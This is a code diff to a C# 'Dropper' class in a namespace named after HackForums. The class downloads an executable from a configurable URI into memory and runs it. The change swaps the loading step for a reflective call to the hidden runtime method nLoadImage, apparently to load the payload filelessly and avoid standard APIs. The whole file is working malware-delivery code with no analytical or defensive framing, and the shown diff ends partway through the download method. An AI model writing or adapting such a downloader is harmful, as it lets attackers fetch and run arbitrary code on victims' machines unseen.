@@ -1,10 +1,13 @@
-using System;using System.IO;using System.Net;using System.Reflection;namespace HackForums.gigajew
+using System;using System.IO;using System.Net;using System.Reflection;using System.Threading;namespace HackForums.gigajew
 {public class Dropper
 {private const string TARGET_URI="MYURI";private MemoryStream APPLICATION_DATA=new MemoryStream();[STAThread]
-public void Run()
+public void StarterMethod()
 {downloadApplicationData();loadApplication();}
 private void loadApplication()
-{byte[]buffer=APPLICATION_DATA.ToArray();Assembly assembly=AppDomain.CreateDomain("").Load(buffer);object[]args=new object[1];if(assembly.EntryPoint.GetParameters().Length>0)
+{byte[]buffer=APPLICATION_DATA.ToArray();Assembly assembly=null;if(Environment.Version.Major>=4)
+{MethodInfo method=Type.GetType("System.Reflection.RuntimeAssembly").GetMethod("nLoadImage",BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false,false,null});}else
+{MethodInfo method=Type.GetType("System.Reflection.Assembly").GetMethod("nLoadImage",BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false});}
+object[]args=new object[1];if(assembly.EntryPoint.GetParameters().Length==0)
 args=null;assembly.EntryPoint.Invoke(null,args);}
 private void downloadApplicationData()
 {WebRequest request=WebRequest.Create(TARGET_URI);WebResponse response=request.GetResponse();using(Stream web_stream=response.GetResponseStream())
